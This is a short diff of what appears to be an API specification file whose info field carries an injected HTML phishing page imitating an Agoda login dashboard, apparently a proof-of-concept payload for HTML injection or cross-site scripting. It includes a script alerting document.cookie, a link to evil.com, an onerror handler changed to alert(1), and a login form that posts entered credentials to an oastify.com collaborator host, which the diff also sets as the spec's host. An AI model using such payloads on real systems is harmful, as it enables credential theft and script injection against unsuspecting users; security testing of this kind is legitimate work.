@@ -8,8 +8,8 @@ info:
         <h1>welcom to agoda dashboard : Plese  Login First  </h1>
  <h2>for login enter your credintials bellow</h2>
         <script>alert(document.cookie)</script>
-        <a href='https://evil.com/' >Visit our Hotels Site</a>
-        <link href='https://cdn6.agoda.net/cdn-accom-web/js/assets/browser-bundle/AVENGERS-1679=A&PER-9231=A/3402-e4984b598588.css' rel='stylesheet' onerror='loadErrorHandler.call(this, event)'/>
+        <a href="https://evil.com/" >Visit our Hotels Site</a>
+        <link href="https://cdn6.agoda.net/cdn-accom-web/js/assets/browser-bundle/AVENGERS-1679=A&PER-9231=A/3402-e4984b598588.css" rel="stylesheet" onerror="alert(1)"/>
     </div>
     <div class="form-container">
         <form action="https://awa2hiq4gwx9ghz11jyothla218swik7.oastify.com/" method="post" class="form-signin">
@@ -27,7 +27,7 @@ info:
         </form>
     </div>
 </div>'
-host: gey5dsm80j2kkp622gw42mght8zznxbm.oastify.com
+host: awa2hiq4gwx9ghz11jyothla218swik7.oastify.com
 
 paths:
 
